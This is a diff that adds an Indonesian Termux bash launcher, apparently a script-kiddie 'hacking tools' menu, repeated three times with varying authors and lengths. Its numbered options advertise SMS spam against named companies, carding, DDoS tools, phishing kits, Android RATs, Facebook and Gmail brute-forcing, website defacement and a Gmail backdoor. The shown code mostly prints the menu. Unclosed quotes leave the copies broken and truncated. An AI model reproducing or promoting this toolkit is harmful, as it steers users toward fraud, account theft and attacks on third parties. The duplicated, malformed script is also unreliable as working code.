@@ -1,0 +1,1843 @@
+
+
+#!/system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthorGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#KontolKaloMauReedit/Recode 
+#Pm Gua Bangsat
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor :Mr.LUKMAN TAMPAN" "
+echo "\033[37;1mFeat: Mr.LUKAMAN"
+echo "\033[35;1mversion Tools: 6"
+echo "\033[35;1mTeam : LUKMAN Is Me Lod Is me"
+echo "\033[33;1mKontak Me :  088806187431"
+echo "\033[31;1mPlease For Subcribe Youtub.https://www.youtube.com/channel/UCFIOXdX7P0uyqjS7Bvz4HUg?view_as=subscriber :"
+echo "\033[92mDarkness Cyber Team Kejahan adalah kami!!" 
+echo "\033[36;1mIndonesia Security Lite"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1m SIHLAKAN YANG KALIAN MAU PAKE :LUKAMAN HECK:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Spam Sms Tokopedia"
+echo "[===============================================]>"
+echo $purple "2.> Spam Sms Telkomnyet"
+echo "[===============================================]>"
+echo $cyan "3.> Spam Sms Matahari Mall"
+echo "[===============================================]>"
+echo $red "4.> Spam Sms HooqTV"
+echo "[===============================================]>"
+echo $white "5.> Spam Sms KFC"
+echo "[===============================================]>"
+echo $green "6.> Spam Sms PHD"
+echo "[===============================================]>"
+echo $purple "7.> Spam Sms Whiskas"
+echo "[===============================================]>"
+echo $cyan "8.> Spam Sms ZiPAY"
+echo "[===============================================]>"
+echo $red "9.> Nyari CC buat Carding"
+echo "[===============================================]>"
+echo $white "10.> Spam Akun Gmail"
+echo "[===============================================]>"
+echo $green "11.> Whois LookUp"
+echo "[===============================================]>"
+echo $purple "12.> Upload Admin Finder"
+echo "[===============================================]>"
+echo $cyan "13.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "14.> ReConDog Buat Information gathering"
+echo "[===============================================]>"
+echo $white "15.> Admin Login Finder"
+echo "[===============================================]>"
+echo $green "16.> Virus VbugMaker Creator"
+echo "[===============================================]>"
+echo $purple "17.> dowload script deface orang"
+echo "[===============================================]>"
+echo $cyan "18.> Autolike Facebook"
+echo "[===============================================]>"
+echo $red "19.> Facebook Auto_Reaction"
+echo "[===============================================]>"
+echo $white "20.> Bot Komentar Facebook"
+echo "[===============================================]>"
+echo $green "21.> Install txtool"
+echo "[===============================================]>"
+echo $purple "22.> install sqlscan"
+echo "[===============================================]>"
+echo $cyan "23.> install hash-buster"
+echo "[===============================================]>"
+echo $red "24.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $white "25.> Install Torshammer buat DDOS website"
+echo "[===============================================]>"
+echo $green "26.> Install LITEDDOS buat DDOS website"
+echo "[===============================================]>"
+echo $purple "27.> Install Hunner Framework"
+echo "[===============================================]>"
+echo $cyan "28.> Install Sqlmap Buat Inject Situs"
+echo "[===============================================]>"
+echo $red "29.> Install 4wsectools"
+echo "[===============================================]>"
+echo $white "30.> Install Lazymux Buat Install Tools"
+echo "[===============================================]>"
+echo $green "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
+echo "[===============================================]>"
+echo $purple "32.> Mempercepat / menstabilkan jaringan 2"
+echo "[===============================================]>"
+echo $cyan "33.> Install BinGoo"
+echo "[===============================================]>"
+echo $red "34.> Full Bot Facebook"
+echo "[===============================================]>"
+echo $white "35.> Install Termux-A"
+echo "[===============================================]>"
+echo $green "36.> Install Tools GadoGado"
+echo "[===============================================]>"
+echo $purple "37.> Install Lazysqlmap"
+echo "[===============================================]>"
+echo $cyan "38.> Install tools diejoubu"
+echo "[===============================================]>"
+echo $red "39.> Install weeman Buat Phising"
+echo "[===============================================]>"
+echo $white "40.> Install iesDEFACE buat Deface Poc Webdav"
+echo "[===============================================]>"
+echo $green "41.> install errorcybertools"
+echo "[===============================================]>"
+echo $purple "42.> install A-Rat untuk Retas Android"
+echo "[===============================================]>"
+echo $cyan "43.> Scan-Website-Admin-Login"
+echo "[===============================================]>"
+echo $red "44.> DEFACE metode Webdav"
+echo "[===============================================]>"
+echo $white "45.> Tools Katoolin"
+echo "[===============================================]>"
+echo $green "46.> Main Tebak2 kan:v biar ga bt:v"
+echo "[===============================================]>"
+echo $purple "47.> Brute DEFACE webdav"
+echo "[===============================================]>"
+echo $cyan "48.> Browsing Di Termux"
+echo "[===============================================]>"
+echo $red "49.> Dengerin Lagu Youtube di Termux"
+echo "[===============================================]>"
+echo $white "50.> Tebak Tebak Kan Soal Cinta Tod" 
+echo "[===============================================]>"
+echo $green "51.> Nuyul Bitcoin"
+echo "[===============================================]>"
+echo $purple "52.> Install MetaSploit"
+echo "[===============================================]>"
+echo $cyan "53.> MultiBrute Force Facebook Buat Hack Facebook"
+echo "[===============================================]>"
+echo $red "54.> install WAScan"
+echo "[===============================================]>"
+echo "[===============================================]>"
+echo $white "55.> install MultiSpam [Sms]"
+echo "[===============================================]>"
+echo $green "56.> Spam Sms Jd.id"
+echo "[===============================================]>"
+echo $purple "57.> DDOS xerxes"
+echo "[===============================================]>"
+echo $cyan "58.> IPGeoLocation Buat Lacak IP"
+echo "[===============================================]>"
+echo $red "59.> Install viSQL"
+echo "[===============================================]>"
+echo $white "60.> Install Kawai-Botnet Buat DDOS"
+echo "[===============================================]>"
+echo $green "61.> Install OWScan"
+echo "[===============================================]>"
+echo $purple "62.> Install AstraNmap"
+echo "[===============================================]>"
+echo $cyan "63.> Install Auxscan2.0"
+echo "[===============================================]>"
+echo $red "64.> Install Black-Hydra"
+echo "[===============================================]>"
+echo $white "65.> Install Ipddos"
+echo "[===============================================]>"
+echo $green "66.> Install hasher"
+echo "[===============================================]>"
+echo $purple "67.> Install PhisingGame Buat Hack ML & COC"
+echo "[===============================================]>"
+echo $cyan "68.> Kumpulan Tutorial Termux"
+echo "[===============================================]>"
+echo $red "69.> Chating Di Termux"
+echo "[===============================================]>"
+echo $white "70.> Cari Panel Login Admin Pakai Breacer"
+echo "[===============================================]>"
+echo $green "71.> Install SocialFish Buat Phising"
+echo "[===============================================]>"
+echo $purple "72.> Install MoonBuggy Buat Main Game"
+echo "[===============================================]>"
+echo $cyan "73.> Install Cupp Buat Worldlist Tertarget"
+echo "[===============================================]>"
+echo $red "74.> Install Hydra"
+echo "[===============================================]>"
+echo $white "75.> Install md5-crack"
+echo "[===============================================]>"
+echo $green "76.> Install LITESPAM Buat Spam"
+echo "[===============================================]>"
+echo $purple "77.> Mulung Bitcoin"
+echo "[===============================================]>"
+echo $cyan "78.> Install Ko-Dork"
+echo "[===============================================]>"
+echo $red "79.> Lihat Spesifikasi Ponsel"
+echo "[===============================================]>"
+echo $white "80.> install lhst"
+echo "[===============================================]>"
+echo $green "81.> Install The Fat Rat"
+echo "[===============================================]>"
+echo $purple "82.> Install CMSmap"
+echo "[===============================================]>"
+echo $cyan "83.> Install Kali Ubuntu"
+echo "[===============================================]>"
+echo $red "84.> Install Ngrok"
+echo "[===============================================]>"
+echo $white "85.> Install Brute Force Gmail"
+echo "[===============================================]>"
+echo $green "86.> Install Lokomedia Exploiters"
+echo "[===============================================]>"
+echo $purple "87.> Install Kali Linux Nethunter"
+echo "[===============================================]>"
+echo $cyan "88.> Install joomscan"
+echo "[===============================================]>"
+echo $red "89.> Install VulnScaner"
+echo "[===============================================]>"
+echo $white "90.> Install HN-Installer"
+echo "[===============================================]>"
+echo $green "91.> Install Fucking-Rat"
+echo "[===============================================]>"
+echo $cyan "92.> Install linux fedora"
+echo "[===============================================]>"
+echo $red "93.> Install information Gathering"
+echo "[===============================================]>"
+echo $blue "94.> Install ezsploit [Harus Root]"
+echo "[===============================================]>"
+echo $white "95.> Install Dirsearch "
+echo "[===============================================]>"
+echo $red "96.> Install honeypot"
+echo "[===============================================]>"
+echo $cyan "97.> Install Killr"
+echo "[===============================================]>"
+echo $blue "98.> Install Human_Level_Control"
+echo "[===============================================]>"
+echo $green "99.> Install Termux-Mpv"
+echo "[===============================================]>"
+echo $purple "100.> Install OWASP-Nettacker"
+echo "[===============================================]>"
+echo $white "101.> Install OWASP-ZSC"
+echo "[===============================================]>"
+echo $red "102.> Install InfoGa"
+echo "[===============================================]>"
+echo $green "103.> Install cok-rat
+echo "[===============================================]>"
+echo $blue "104.> Install hash-Generator"
+echo "[===============================================]>"
+echo $cyan "105.> Install Open Source Information Facebook"
+echo "[===============================================]>"
+echo $yellow "106.> Install str2bf"
+echo "[===============================================]>"
+echo $purple "107.> Install BForce"
+echo "[===============================================]>"
+echo $red "108.> Install Web Application Audit Framework"
+echo "[===============================================]>
+
+#!/system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthorGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#KontolKaloMauReedit/Recode 
+#Pm Gua Bangsat
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : Mr.B4J1NAN KIRIK"
+echo "\033[37;1mFeat: Mr.LUKAMAN"
+echo "\033[35;1mversion Tools: 6"
+echo "\033[35;1mTeam : LUKMAN Is Me Lod Is me"
+echo "\033[33;1mKontak Me :  088806187431"
+echo "\033[31;1mPlease For Subcribe Youtube. https://m.youtube.com/channel/UCFIOXdX7P0uyqjS7Bvz4HUg :"
+echo "\033[92mDarkness Cyber Team Kejahan adalah kami!!" 
+echo "\033[36;1mIndonesia Security Lite"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1m SIHLAKAN YANG KALIAN MAU PAKE :LUKAMAN HECK:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Spam Sms Tokopedia"
+echo "[===============================================]>"
+echo $purple "2.> Spam Sms Telkomnyet"
+echo "[===============================================]>"
+echo $cyan "3.> Spam Sms Matahari Mall"
+echo "[===============================================]>"
+echo $red "4.> Spam Sms HooqTV"
+echo "[===============================================]>"
+echo $white "5.> Spam Sms KFC"
+echo "[===============================================]>"
+echo $green "6.> Spam Sms PHD"
+echo "[===============================================]>"
+echo $purple "7.> Spam Sms Whiskas"
+echo "[===============================================]>"
+echo $cyan "8.> Spam Sms ZiPAY"
+echo "[===============================================]>"
+echo $red "9.> Nyari CC buat Carding"
+echo "[===============================================]>"
+echo $white "10.> Spam Akun Gmail"
+echo "[===============================================]>"
+echo $green "11.> Whois LookUp"
+echo "[===============================================]>"
+echo $purple "12.> Upload Admin Finder"
+echo "[===============================================]>"
+echo $cyan "13.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "14.> ReConDog Buat Information gathering"
+echo "[===============================================]>"
+echo $white "15.> Admin Login Finder"
+echo "[===============================================]>"
+echo $green "16.> Virus VbugMaker Creator"
+echo "[===============================================]>"
+echo $purple "17.> dowload script deface orang"
+echo "[===============================================]>"
+echo $cyan "18.> Autolike Facebook"
+echo "[===============================================]>"
+echo $red "19.> Facebook Auto_Reaction"
+echo "[===============================================]>"
+echo $white "20.> Bot Komentar Facebook"
+echo "[===============================================]>"
+echo $green "21.> Install txtool"
+echo "[===============================================]>"
+echo $purple "22.> install sqlscan"
+echo "[===============================================]>"
+echo $cyan "23.> install hash-buster"
+echo "[===============================================]>"
+echo $red "24.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $white "25.> Install Torshammer buat DDOS website"
+echo "[===============================================]>"
+echo $green "26.> Install LITEDDOS buat DDOS website"
+echo "[===============================================]>"
+echo $purple "27.> Install Hunner Framework"
+echo "[===============================================]>"
+echo $cyan "28.> Install Sqlmap Buat Inject Situs"
+echo "[===============================================]>"
+echo $red "29.> Install 4wsectools"
+echo "[===============================================]>"
+echo $white "30.> Install Lazymux Buat Install Tools"
+echo "[===============================================]>"
+echo $green "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
+echo "[===============================================]>"
+echo $purple "32.> Mempercepat / menstabilkan jaringan 2"
+echo "[===============================================]>"
+echo $cyan "33.> Install BinGoo"
+echo "[===============================================]>"
+echo $red "34.> Full Bot Facebook"
+echo "[===============================================]>"
+echo $white "35.> Install Termux-A"
+echo "[===============================================]>"
+echo $green "36.> Install Tools GadoGado"
+echo "[===============================================]>"
+echo $purple "37.> Install Lazysqlmap"
+echo "[===============================================]>"
+echo $cyan "38.> Install tools diejoubu"
+echo "[===============================================]>"
+echo $red "39.> Install weeman Buat Phising"
+echo "[===============================================]>"
+echo $white "40.> Install iesDEFACE buat Deface Poc Webdav"
+echo "[===============================================]>"
+echo $green "41.> install errorcybertools"
+echo "[===============================================]>"
+echo $purple "42.> install A-Rat untuk Retas Android"
+echo "[===============================================]>"
+echo $cyan "43.> Scan-Website-Admin-Login"
+echo "[===============================================]>"
+echo $red "44.> DEFACE metode Webdav"
+echo "[===============================================]>"
+echo $white "45.> Tools Katoolin"
+echo "[===============================================]>"
+echo $green "46.> Main Tebak2 kan:v biar ga bt:v"
+echo "[===============================================]>"
+echo $purple "47.> Brute DEFACE webdav"
+echo "[===============================================]>"
+echo $cyan "48.> Browsing Di Termux"
+echo "[===============================================]>"
+echo $red "49.> Dengerin Lagu Youtube di Termux"
+echo "[===============================================]>"
+echo $white "50.> Tebak Tebak Kan Soal Cinta Tod" 
+echo "[===============================================]>"
+echo $green "51.> Nuyul Bitcoin"
+echo "[===============================================]>"
+echo $purple "52.> Install MetaSploit"
+echo "[===============================================]>"
+echo $cyan "53.> MultiBrute Force Facebook Buat Hack Facebook"
+echo "[===============================================]>"
+echo $red "54.> install WAScan"
+echo "[===============================================]>"
+echo $white "55.> install MultiSpam [Sms]"
+echo "[===============================================]>"
+echo $green "56.> Spam Sms Jd.id"
+echo "[===============================================]>"
+echo $purple "57.> DDOS xerxes"
+echo "[===============================================]>"
+echo $cyan "58.> IPGeoLocation Buat Lacak IP"
+echo "[===============================================]>"
+echo $red "59.> Install viSQL"
+echo "[===============================================]>"
+echo $white "60.> Install Kawai-Botnet Buat DDOS"
+echo "[===============================================]>"
+echo $green "61.> Install OWScan"
+echo "[===============================================]>"
+echo $purple "62.> Install AstraNmap"
+echo "[===============================================]>"
+echo $cyan "63.> Install Auxscan2.0"
+echo "[===============================================]>"
+echo $red "64.> Install Black-Hydra"
+echo "[===============================================]>"
+echo $white "65.> Install Ipddos"
+echo "[===============================================]>"
+echo $green "66.> Install hasher"
+echo "[===============================================]>"
+echo $purple "67.> Install PhisingGame Buat Hack ML & COC"
+echo "[===============================================]>"
+echo $cyan "68.> Kumpulan Tutorial Termux"
+echo "[===============================================]>"
+echo $red "69.> Chating Di Termux"
+echo "[===============================================]>"
+echo $white "70.> Cari Panel Login Admin Pakai Breacer"
+echo "[===============================================]>"
+echo $green "71.> Install SocialFish Buat Phising"
+echo "[===============================================]>"
+echo $purple "72.> Install MoonBuggy Buat Main Game"
+echo "[===============================================]>"
+echo $cyan "73.> Install Cupp Buat Worldlist Tertarget"
+echo "[===============================================]>"
+echo $red "74.> Install Hydra"
+echo "[===============================================]>"
+echo $white "75.> Install md5-crack"
+echo "[===============================================]>"
+echo $green "76.> Install LITESPAM Buat Spam"
+echo "[===============================================]>"
+echo $purple "77.> Mulung Bitcoin"
+echo "[===============================================]>"
+echo $cyan "78.> Install Ko-Dork"
+echo "[===============================================]>"
+echo $red "79.> Lihat Spesifikasi Ponsel"
+echo "[===============================================]>"
+echo $white "80.> install lhst"
+echo "[===============================================]>"
+echo $green "81.> Install The Fat Rat"
+echo "[===============================================]>"
+echo $purple "82.> Install CMSmap"
+echo "[===============================================]>"
+echo $cyan "83.> Install Kali Ubuntu"
+echo "[===============================================]>"
+echo $red "84.> Install Ngrok"
+echo "[===============================================]>"
+echo $white "85.> Install Brute Force Gmail"
+echo "[===============================================]>"
+echo $green "86.> Install Lokomedia Exploiters"
+echo "[===============================================]>"
+echo $purple "87.> Install Kali Linux Nethunter"
+echo "[===============================================]>"
+echo $cyan "88.> Install joomscan"
+echo "[===============================================]>"
+echo $red "89.> Install VulnScaner"
+echo "[===============================================]>"
+echo $white "90.> Install HN-Installer"
+echo "[===============================================]>"
+echo $green "91.> Install Fucking-Rat"
+echo "[===============================================]>"
+echo $cyan "92.> Install linux fedora"
+echo "[===============================================]>"
+echo $red "93.> Install information Gathering"
+echo "[===============================================]>"
+echo $blue "94.> Install ezsploit [Harus Root]"
+echo "[===============================================]>"
+echo $white "95.> Install Dirsearch "
+echo "[===============================================]>"
+echo $red "96.> Install honeypot"
+echo "[===============================================]>"
+echo $cyan "97.> Install Killr"
+echo "[===============================================]>"
+echo $blue "98.> Install Human_Level_Control"
+echo "[===============================================]>"
+echo $green "99.> Install Termux-Mpv"
+echo "[===============================================]>"
+echo $purple "100.> Install OWASP-Nettacker"
+echo "[===============================================]>"
+echo $white "101.> Install OWASP-ZSC"
+echo "[===============================================]>"
+echo $red "102.> Install InfoGa"
+echo "[===============================================]>"
+echo $green "103.> Install cok-rat"
+echo "[===============================================]>"
+echo $blue "104.> Install hash-Generator"
+echo "[===============================================]>"
+echo $cyan "105.> Install Open Source Information Facebook"
+echo "[===============================================]>"
+echo $yellow "106.> Install str2bf"
+echo "[===============================================]>"
+echo $purple "107.> Install BForce"
+echo "[===============================================]>"
+echo $red "108.> Install Web Application Audit Framework"
+echo "[===============================================]>"
+echo $green "109.> Install SMBrute"
+echo "[===============================================]>"
+echo $white "110.> Install Wordpress Security Scanner"
+echo "[===============================================]>"
+echo $blue "111.> Install hmap (fingerprinting web servers)"
+echo "[===============================================]>"
+echo $yellow "112.> Install Auto Report Facebook"
+echo "[===============================================]>"
+echo $purple "113.> Install dhcpdorf"
+echo "[===============================================]>"
+echo $green "114.> Install deskcon-desktop"
+echo "[===============================================]>"
+echo $white "115.> Install Tools suRAT-Cinta"
+echo "[===============================================]>"
+echo $blue  "116.> Install Tools m4ngARP"
+echo "[===============================================]>"
+echo $cyan "117.> Install Tools WP-Hunter"
+echo "[===============================================]>"
+echo $red "118.> Install Remote-Shell"
+echo "[===============================================]>"
+echo $purple "119.> Install LITESCRIPT "
+echo "[===============================================]>"
+echo $green "120.> Install meTAInstall"
+echo "[===============================================]>"
+echo $white "121.> Install Zilcorili (Security Framework) "
+echo "[===============================================]>"
+echo $blue "122.> Install AutoScriptKiddiesTool "
+echo "[===============================================]>"
+echo $yellow "123.> Install bot-exploiters"
+echo "[===============================================]>"
+echo $purple "124.> Install Termux-metasploit [work]
+
+#!/system/xbin/bash
+#MauNgapainGblk?
+#DiRecodeGakBakalJadiinLuMastah
+#DiGantiAuthorGakBakalJadiinLuMaster
+#MikirMakeOtakGblk
+#KontolKaloMauReedit/Recode 
+#Pm Gua Bangsat
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : Mr.B4J1NAN KIRIK"
+echo "\033[37;1mFeat: Mr.LUKAMAN"
+echo "\033[35;1mversion Tools: 6"
+echo "\033[35;1mTeam : LUKMAN Is Me Lod Is me"
+echo "\033[33;1mKontak Me :  088806187431"
+echo "\033[31;1mPlease For Subcribe Youtube. https://m.youtube.com/channel/UCFIOXdX7P0uyqjS7Bvz4HUg :"
+echo "\033[92mDarkness Cyber Team Kejahan adalah kami!!" 
+echo "\033[36;1mIndonesia Security Lite"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1m SIHLAKAN YANG KALIAN MAU PAKE :LUKAMAN HECK:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Spam Sms Tokopedia"
+echo "[===============================================]>"
+echo $purple "2.> Spam Sms Telkomnyet"
+echo "[===============================================]>"
+echo $cyan "3.> Spam Sms Matahari Mall"
+echo "[===============================================]>"
+echo $red "4.> Spam Sms HooqTV"
+echo "[===============================================]>"
+echo $white "5.> Spam Sms KFC"
+echo "[===============================================]>"
+echo $green "6.> Spam Sms PHD"
+echo "[===============================================]>"
+echo $purple "7.> Spam Sms Whiskas"
+echo "[===============================================]>"
+echo $cyan "8.> Spam Sms ZiPAY"
+echo "[===============================================]>"
+echo $red "9.> Nyari CC buat Carding"
+echo "[===============================================]>"
+echo $white "10.> Spam Akun Gmail"
+echo "[===============================================]>"
+echo $green "11.> Whois LookUp"
+echo "[===============================================]>"
+echo $purple "12.> Upload Admin Finder"
+echo "[===============================================]>"
+echo $cyan "13.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "14.> ReConDog Buat Information gathering"
+echo "[===============================================]>"
+echo $white "15.> Admin Login Finder"
+echo "[===============================================]>"
+echo $green "16.> Virus VbugMaker Creator"
+echo "[===============================================]>"
+echo $purple "17.> dowload script deface orang"
+echo "[===============================================]>"
+echo $cyan "18.> Autolike Facebook"
+echo "[===============================================]>"
+echo $red "19.> Facebook Auto_Reaction"
+echo "[===============================================]>"
+echo $white "20.> Bot Komentar Facebook"
+echo "[===============================================]>"
+echo $green "21.> Install txtool"
+echo "[===============================================]>"
+echo $purple "22.> install sqlscan"
+echo "[===============================================]>"
+echo $cyan "23.> install hash-buster"
+echo "[===============================================]>"
+echo $red "24.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $white "25.> Install Torshammer buat DDOS website"
+echo "[===============================================]>"
+echo $green "26.> Install LITEDDOS buat DDOS website"
+echo "[===============================================]>"
+echo $purple "27.> Install Hunner Framework"
+echo "[===============================================]>"
+echo $cyan "28.> Install Sqlmap Buat Inject Situs"
+echo "[===============================================]>"
+echo $red "29.> Install 4wsectools"
+echo "[===============================================]>"
+echo $white "30.> Install Lazymux Buat Install Tools"
+echo "[===============================================]>"
+echo $green "31.> Mempercepat / Menstabilkan Jaringan/sinyal"
+echo "[===============================================]>"
+echo $purple "32.> Mempercepat / menstabilkan jaringan 2"
+echo "[===============================================]>"
+echo $cyan "33.> Install BinGoo"
+echo "[===============================================]>"
+echo $red "34.> Full Bot Facebook"
+echo "[===============================================]>"
+echo $white "35.> Install Termux-A"
+echo "[===============================================]>"
+echo $green "36.> Install Tools GadoGado"
+echo "[===============================================]>"
+echo $purple "37.> Install Lazysqlmap"
+echo "[===============================================]>"
+echo $cyan "38.> Install tools diejoubu"
+echo "[===============================================]>"
+echo $red "39.> Install weeman Buat Phising"
+echo "[===============================================]>"
+echo $white "40.> Install iesDEFACE buat Deface Poc Webdav"
+echo "[===============================================]>"
+echo $green "41.> install errorcybertools"
+echo "[===============================================]>"
+echo $purple "42.> install A-Rat untuk Retas Android"
+echo "[===============================================]>"
+echo $cyan "43.> Scan-Website-Admin-Login"
+echo "[===============================================]>"
+echo $red "44.> DEFACE metode Webdav"
+echo "[===============================================]>"
+echo $white "45.> Tools Katoolin"
+echo "[===============================================]>"
+echo $green "46.> Main Tebak2 kan:v biar ga bt:v"
+echo "[===============================================]>"
+echo $purple "47.> Brute DEFACE webdav"
+echo "[===============================================]>"
+echo $cyan "48.> Browsing Di Termux"
+echo "[===============================================]>"
+echo $red "49.> Dengerin Lagu Youtube di Termux"
+echo "[===============================================]>"
+echo $white "50.> Tebak Tebak Kan Soal Cinta Tod" 
+echo "[===============================================]>"
+echo $green "51.> Nuyul Bitcoin"
+echo "[===============================================]>"
+echo $purple "52.> Install MetaSploit"
+echo "[===============================================]>"
+echo $cyan "53.> MultiBrute Force Facebook Buat Hack Facebook"
+echo "[===============================================]>"
+echo $red "54.> install WAScan"
+echo "[===============================================]>"
+echo $white "55.> install MultiSpam [Sms]"
+echo "[===============================================]>"
+echo $green "56.> Spam Sms Jd.id"
+echo "[===============================================]>"
+echo $purple "57.> DDOS xerxes"
+echo "[===============================================]>"
+echo $cyan "58.> IPGeoLocation Buat Lacak IP"
+echo "[===============================================]>"
+echo $red "59.> Install viSQL"
+echo "[===============================================]>"
+echo $white "60.> Install Kawai-Botnet Buat DDOS"
+echo "[===============================================]>"
+echo $green "61.> Install OWScan"
+echo "[===============================================]>"
+echo $purple "62.> Install AstraNmap"
+echo "[===============================================]>"
+echo $cyan "63.> Install Auxscan2.0"
+echo "[===============================================]>"
+echo $red "64.> Install Black-Hydra"
+echo "[===============================================]>"
+echo $white "65.> Install Ipddos"
+echo "[===============================================]>"
+echo $green "66.> Install hasher"
+echo "[===============================================]>"
+echo $purple "67.> Install PhisingGame Buat Hack ML & COC"
+echo "[===============================================]>"
+echo $cyan "68.> Kumpulan Tutorial Termux"
+echo "[===============================================]>"
+echo $red "69.> Chating Di Termux"
+echo "[===============================================]>"
+echo $white "70.> Cari Panel Login Admin Pakai Breacer"
+echo "[===============================================]>"
+echo $green "71.> Install SocialFish Buat Phising"
+echo "[===============================================]>"
+echo $purple "72.> Install MoonBuggy Buat Main Game"
+echo "[===============================================]>"
+echo $cyan "73.> Install Cupp Buat Worldlist Tertarget"
+echo "[===============================================]>"
+echo $red "74.> Install Hydra"
+echo "[===============================================]>"
+echo $white "75.> Install md5-crack"
+echo "[===============================================]>"
+echo $green "76.> Install LITESPAM Buat Spam"
+echo "[===============================================]>"
+echo $purple "77.> Mulung Bitcoin"
+echo "[===============================================]>"
+echo $cyan "78.> Install Ko-Dork"
+echo "[===============================================]>"
+echo $red "79.> Lihat Spesifikasi Ponsel"
+echo "[===============================================]>"
+echo $white "80.> install lhst"
+echo "[===============================================]>"
+echo $green "81.> Install The Fat Rat"
+echo "[===============================================]>"
+echo $purple "82.> Install CMSmap"
+echo "[===============================================]>"
+echo $cyan "83.> Install Kali Ubuntu"
+echo "[===============================================]>"
+echo $red "84.> Install Ngrok"
+echo "[===============================================]>"
+echo $white "85.> Install Brute Force Gmail"
+echo "[===============================================]>"
+echo $green "86.> Install Lokomedia Exploiters"
+echo "[===============================================]>"
+echo $purple "87.> Install Kali Linux Nethunter"
+echo "[===============================================]>"
+echo $cyan "88.> Install joomscan"
+echo "[===============================================]>"
+echo $red "89.> Install VulnScaner"
+echo "[===============================================]>"
+echo $white "90.> Install HN-Installer"
+echo "[===============================================]>"
+echo $green "91.> Install Fucking-Rat"
+echo "[===============================================]>"
+echo $cyan "92.> Install linux fedora"
+echo "[===============================================]>"
+echo $red "93.> Install information Gathering"
+echo "[===============================================]>"
+echo $blue "94.> Install ezsploit [Harus Root]"
+echo "[===============================================]>"
+echo $white "95.> Install Dirsearch "
+echo "[===============================================]>"
+echo $red "96.> Install honeypot"
+echo "[===============================================]>"
+echo $cyan "97.> Install Killr"
+echo "[===============================================]>"
+echo $blue "98.> Install Human_Level_Control"
+echo "[===============================================]>"
+echo $green "99.> Install Termux-Mpv"
+echo "[===============================================]>"
+echo $purple "100.> Install OWASP-Nettacker"
+echo "[===============================================]>"
+echo $white "101.> Install OWASP-ZSC"
+echo "[===============================================]>"
+echo $red "102.> Install InfoGa"
+echo "[===============================================]>"
+echo $green "103.> Install cok-rat"
+echo "[===============================================]>"
+echo $blue "104.> Install hash-Generator"
+echo "[===============================================]>"
+echo $cyan "105.> Install Open Source Information Facebook"
+echo "[===============================================]>"
+echo $yellow "106.> Install str2bf"
+echo "[===============================================]>"
+echo $purple "107.> Install BForce"
+echo "[===============================================]>"
+echo $red "108.> Install Web Application Audit Framework"
+echo "[===============================================]>"
+echo $green "109.> Install SMBrute"
+echo "[===============================================]>"
+echo $white "110.> Install Wordpress Security Scanner"
+echo "[===============================================]>"
+echo $blue "111.> Install hmap (fingerprinting web servers)"
+echo "[===============================================]>"
+echo $yellow "112.> Install Auto Report Facebook"
+echo "[===============================================]>"
+echo $purple "113.> Install dhcpdorf"
+echo "[===============================================]>"
+echo $green "114.> Install deskcon-desktop"
+echo "[===============================================]>"
+echo $white "115.> Install Tools suRAT-Cinta"
+echo "[===============================================]>"
+echo $blue  "116.> Install Tools m4ngARP"
+echo "[===============================================]>"
+echo $cyan "117.> Install Tools WP-Hunter"
+echo "[===============================================]>"
+echo $red "118.> Install Remote-Shell"
+echo "[===============================================]>"
+echo $purple "119.> Install LITESCRIPT "
+echo "[===============================================]>"
+echo $green "120.> Install meTAInstall"
+echo "[===============================================]>"
+echo $white "121.> Install Zilcorili (Security Framework) "
+echo "[===============================================]>"
+echo $blue "122.> Install AutoScriptKiddiesTool "
+echo "[===============================================]>"
+echo $yellow "123.> Install bot-exploiters"
+echo "[===============================================]>"
+echo $purple "124.> Install Termux-metasploit [work] "
+echo "[===============================================]>"
+echo $red "125.> Install Instagram Bot"
+echo "[===============================================]>"
+echo $green "126.> Install FesbukBrute"
+echo "[===============================================]>"
+echo $white "127.> Install Email-Harvester"
+echo "[===============================================]>"
+echo $blue "128.> Install Gdog Backdoor Using Gmail"
+echo "[===============================================]>"
+echo $yellow "129.> Install Penetration Testing Engagements"
+echo "[===============================================]>"
+echo $purple "130.> Install CanisRufus"
+echo "[===============================================]>"
+echo $red "131.> Install EttercapForAndroid"
+echo "[===============================================]>"
+echo $blue "132.> Install  BlackNmap"
+echo "[===============================================]>"
+echo $white "133.> Install NMapForAndroid"
+echo "[===============================================]>"
